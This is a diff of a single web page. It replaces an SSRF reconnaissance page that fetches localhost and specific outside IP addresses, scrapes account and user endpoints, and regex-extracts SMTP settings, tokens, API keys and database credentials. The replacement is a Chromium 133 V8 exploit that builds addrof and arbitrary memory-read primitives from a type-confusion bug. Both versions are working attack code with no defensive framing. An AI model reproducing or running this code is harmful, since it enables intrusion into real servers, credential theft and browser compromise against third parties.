@@ -1,104 +1,26 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>R</title></head><body>
-<pre id="o">Init</pre>
-<script>
-var O=document.getElementById('o');O.textContent='';
-function L(m){O.textContent+=m+'\n'}
-
-L('=== SSRF Internal Recon V80 ===');
-L('Time: '+new Date().toISOString());
-L('UA: '+navigator.userAgent);
-
-if(navigator.userAgentData){
-    navigator.userAgentData.getHighEntropyValues(['fullVersionList','platform','platformVersion','architecture','bitness']).then(function(d){
-        L('Version: '+JSON.stringify(d.fullVersionList));
-        L('Platform: '+d.platform+' '+d.platformVersion+' '+d.architecture+'/'+d.bitness);
-    });
-}
-
-L('');
-L('Fetching internal endpoints with credentials...');
-
-var targets = [
-    {url:'https://127.0.0.1/backend/ax/init.php?node=3', name:'localhost init.php'},
-    {url:'https://127.0.0.1/ax/veh/list.php?node=3', name:'localhost veh/list'},
-    {url:'https://127.0.0.1/ax/accounts.php?node=3', name:'localhost accounts'},
-    {url:'https://127.0.0.1/ax/users.php?node=3', name:'localhost users'},
-    {url:'https://127.0.0.1/ax/devices.php?node=3', name:'localhost devices'},
-    {url:'https://127.0.0.1/ax/groups.php?node=3', name:'localhost groups'},
-    {url:'https://127.0.0.1/ax/tracks.php?node=3', name:'localhost tracks'},
-    {url:'https://127.0.0.1/server-status', name:'Apache status'},
-    {url:'https://127.0.0.1/nginx_status', name:'Nginx status'},
-    {url:'https://127.0.0.1/phpinfo.php', name:'phpinfo'},
-    {url:'https://127.0.0.1/info.php', name:'info.php'},
-    {url:'https://127.0.0.1/backend/ax/init.php', name:'init.php no node'},
-    {url:'https://41.71.64.235/backend/ax/init.php?node=3', name:'admin init.php'},
-    {url:'https://41.71.64.235/ax/veh/list.php?node=3', name:'admin veh/list'},
-    {url:'https://41.71.64.235/ax/accounts.php?node=3', name:'admin accounts'},
-    {url:'https://41.71.64.235/ax/users.php?node=3', name:'admin users'},
-    {url:'https://41.71.64.233/backend/ax/init.php?node=3', name:'.233 init.php'},
-    {url:'https://41.71.64.234/backend/ax/init.php?node=3', name:'.234 init.php'},
-    {url:'https://41.71.64.237/backend/ax/init.php?node=3', name:'.237 init.php'},
-    {url:'https://41.71.64.238/backend/ax/init.php?node=3', name:'.238 init.php'},
-];
-
-var done=0;
-for(var i=0;i<targets.length;i++){
-    (function(t,idx){
-        var x=new XMLHttpRequest();
-        x.open('GET',t.url,true);
-        x.timeout=8000;
-        x.onload=function(){
-            var body=x.responseText;
-            L('['+idx+'] '+t.name+' HTTP '+x.status+' ('+body.length+' chars)');
-            if(body.length>0 && body.length<5000){
-                L('  BODY: '+body.substring(0,2000));
-            } else if(body.length>=5000){
-                L('  BODY[0:2000]: '+body.substring(0,2000));
-                // Extract secrets
-                var smtpM=body.match(/"smtp":\{[^}]+\}/);
-                if(smtpM) L('  SMTP: '+smtpM[0]);
-                var tokenM=body.match(/"token":"[^"]+"/);
-                if(tokenM) L('  TOKEN: '+tokenM[0]);
-                var apiM=body.match(/"apiKey":"[^"]+"/);
-                if(apiM) L('  APIKEY: '+apiM[0]);
-                var dbM=body.match(/(db_host|db_pass|database|dsn|connection)[^"]*"[^"]*"/i);
-                if(dbM) L('  DB: '+dbM[0]);
-            }
-            done++;
-            if(done>=targets.length) L('\nDone: '+done+'/'+targets.length);
-        };
-        x.onerror=function(){
-            L('['+idx+'] '+t.name+' NETWORK ERROR');
-            done++;
-            if(done>=targets.length) L('\nDone: '+done+'/'+targets.length);
-        };
-        x.ontimeout=function(){
-            L('['+idx+'] '+t.name+' TIMEOUT');
-            done++;
-            if(done>=targets.length) L('\nDone: '+done+'/'+targets.length);
-        };
-        x.send();
-    })(targets[i],i);
-}
+<!doctype html><meta charset=utf-8><title>CASI V77 M133 BASELINE METADATA</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V77 CHROMIUM 133 BASELINE METADATA ONLY</b><pre id=o>START</pre><script>
+var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);
+function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}
+function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}
+function hax(t){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=t?hole:"not the hole";let len=o.maybe_hole.length,sign=Math.sign(len),i1=2-(sign+1),i2=5-(i1+4)>>1,i3=2*i2+2,i4=i3>>1,i5=i4*1000;let a=new Array(8);a[0]=13.37;a[i5]=13.37;return a}
+try{
+ let src="";for(let q=0;q<512;q++)src+="let v"+q+"=0;";
+ let counts=[0,1,2,4,8,16,32,64],funcs=[];
+ for(let q=0;q<counts.length;q++)funcs.push(new Function("p1",src+"return "+q+";"));
+ for(let q=0;q<funcs.length;q++)for(let k=0;k<counts[q];k++)funcs[q](k);
+ let normal=hax(false);for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);
+ let c=hax(true),fa=[1111.1111,2222.2222,3333.3333],oa={p:"AAAA"},ob={p:"BBBB"},objs=[oa,ob],rw=[4444.4444,5555.5555,6666.6666,7777.7777],tail=[8888.8888,9999.9999];
+ let orig30=c[30],s30=ftoi(orig30),orig41=c[41],s41=ftoi(orig41);
+ function addrof(o){objs[0]=o;c[30]=setbits(s30&0xffffffffn,0x1540d9n);let z=objs[0];c[30]=orig30;return ftoi(z)&0xffffffffn}
+ function rd64raw(a){c[41]=setbits(s41&0xffffffffn,a-7n);let z=rw[0];c[41]=orig41;return ftoi(z)}
+ function rd32raw(a){let base=a&~7n,v=rd64raw(base);return Number((a&4n)?(v>>32n):(v&0xffffffffn))}
+ let lines=["DONE","length="+c.length,"orig41=0x"+s41.toString(16)];
+ for(let q=0;q<funcs.length;q++){
+  let fn=(addrof(funcs[q])-1n)&0xffffffffn;
+  let sfitag=rd32raw(fn+0x10n),sfi=(BigInt(sfitag)-1n)&0xffffffffn;
+  let fmap=rd32raw(fn),sfimap=rd32raw(sfi),tfd=rd32raw(sfi+4n),sfi8=rd32raw(sfi+8n),sfic=rd32raw(sfi+12n);
+  lines.push("calls="+counts[q]+" fn=0x"+fn.toString(16)+" fmap=0x"+fmap.toString(16)+" sfi=0x"+sfi.toString(16)+" sfimap=0x"+sfimap.toString(16)+" tfd=0x"+tfd.toString(16)+" sfi8=0x"+sfi8.toString(16)+" sfic=0x"+sfic.toString(16));
+ }
+ lines.push("restored30=0x"+ftoi(c[30]).toString(16),"restored41=0x"+ftoi(c[41]).toString(16));out.textContent=lines.join("\n");
+}catch(e){out.textContent="THREW\n"+e.name+"\n"+e.message}
 </script>
-
-<h3>Internal iframes (visual capture in PDF)</h3>
-<p>A. localhost init.php:</p>
-<iframe src="https://127.0.0.1/backend/ax/init.php?node=3" style="width:100%;height:400px;border:1px solid #999"></iframe>
-
-<p>B. Admin server init.php:</p>
-<iframe src="https://41.71.64.235/backend/ax/init.php?node=3" style="width:100%;height:400px;border:1px solid #999"></iframe>
-
-<p>C. Server .233 init.php:</p>
-<iframe src="https://41.71.64.233/backend/ax/init.php?node=3" style="width:100%;height:200px;border:1px solid #999"></iframe>
-
-<p>D. Server .234 init.php:</p>
-<iframe src="https://41.71.64.234/backend/ax/init.php?node=3" style="width:100%;height:200px;border:1px solid #999"></iframe>
-
-<p>E. localhost phpinfo:</p>
-<iframe src="https://127.0.0.1/phpinfo.php" style="width:100%;height:200px;border:1px solid #999"></iframe>
-
-<p>F. localhost server-status:</p>
-<iframe src="https://127.0.0.1/server-status" style="width:100%;height:200px;border:1px solid #999"></iframe>
-
-</body></html>
